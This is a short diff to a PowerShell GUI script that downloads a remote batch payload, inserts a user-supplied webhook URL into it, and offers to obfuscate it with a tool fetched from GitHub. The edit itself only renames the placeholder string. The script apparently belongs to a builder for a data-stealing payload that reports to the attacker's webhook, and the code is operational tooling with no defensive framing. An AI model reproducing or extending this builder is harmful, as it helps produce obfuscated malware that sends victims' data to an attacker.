@@ -137,7 +137,7 @@ function Invoke-BAT {
     $webhook_url = $var_WEBHOOK_BOX.Text
     $download_url=$download_url+"bat"
     Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
-    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.bat"
+    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE2', $webhook_url) | Set-Content "main.bat"
     $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
     $obfuscate_box = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
     if ($obfuscate_box -ne "Yes") {
@@ -159,7 +159,7 @@ function Invoke-EXE {
     $webhook_url = $var_WEBHOOK_BOX.Text
     $download_url=$download_url+"bat"
     Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
-    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.bat"
+    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE2', $webhook_url) | Set-Content "main.bat"
     $var_OUTPUT_BOX.Text += "Successfully Built BAT`n"
     $var_OUTPUT_BOX.Text += "Obfuscating BAT`n"
     (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
